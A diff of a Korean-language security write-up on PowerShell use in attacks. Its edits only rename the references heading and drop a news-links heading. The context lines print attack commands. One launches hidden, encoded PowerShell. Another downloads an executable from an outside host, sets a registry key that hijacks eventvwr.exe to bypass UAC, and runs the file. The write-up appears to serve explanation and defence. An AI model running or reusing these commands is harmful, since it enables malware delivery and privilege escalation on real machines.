@@ -89,15 +89,10 @@ cmd.exe /c Start /Min PowerShell.exe -NoP -NonI -EP ByPass -W Hidden -E JE9TPShH
 cmd.exe /c powershell.exe -w hiddden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://blog.plura.io/demo/sick.exe','%TEMP%\sick.exe') & reg add HKCU\SOFTWARE\Classes\mscfile\shell\open\command /d %tmp%\sick.exe /f & C:\Windows\system32\eventvwr.exe & PING -n 15 127.0.0.1>nul & %tmp%\sick.exe
 ```
 
-## 참고
+## 📖 함께 읽기
 
 - [SANS 자료](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1511980157.pdf)  
 - [Broadcom 보고서](https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en)  
 - [AhnLab 기사](https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=25651)  
-
----
-
-## 관련 기사, 보안뉴스
-
 - [보안뉴스 보기](https://bit.ly/2V99SLF)
 
